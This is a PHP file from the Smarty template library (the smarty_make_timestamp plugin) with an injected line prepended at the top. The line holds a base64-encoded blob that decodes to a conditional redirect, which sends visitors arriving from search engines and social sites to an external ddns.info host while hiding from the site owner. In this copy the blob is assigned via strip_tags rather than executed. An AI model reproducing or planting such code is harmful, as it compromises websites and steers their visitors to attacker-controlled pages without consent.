<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Smarty shared plugin
 * @package Smarty
 * @subpackage plugins
 */


/**
 * Function: smarty_make_timestamp<br>
 * Purpose:  used by other smarty functions to make a timestamp
 *           from a string.
 * @author   Monte Ohrt <monte at ohrt dot com>
 * @param string
 * @return string
 */
function smarty_make_timestamp($string)
{
    if(empty($string)) {
        // use "now":
        $time = time();

    } elseif (preg_match('/^\d{14}$/', $string)) {
        // it is mysql timestamp format of YYYYMMDDHHMMSS?            
        $time = mktime(substr($string, 8, 2),substr($string, 10, 2),substr($string, 12, 2),
                       substr($string, 4, 2),substr($string, 6, 2),substr($string, 0, 4));
        
    } elseif (is_numeric($string)) {
        // it is a numeric string, we handle it as timestamp
        $time = (int)$string;
        
    } else {
        // strtotime should handle it
        $time = strtotime($string);
        if ($time == -1 || $time === false) {
            // strtotime() was not able to parse $string, use "now":
            $time = time();
        }
    }
    return $time;

}

/* vim: set expandtab: */

?>
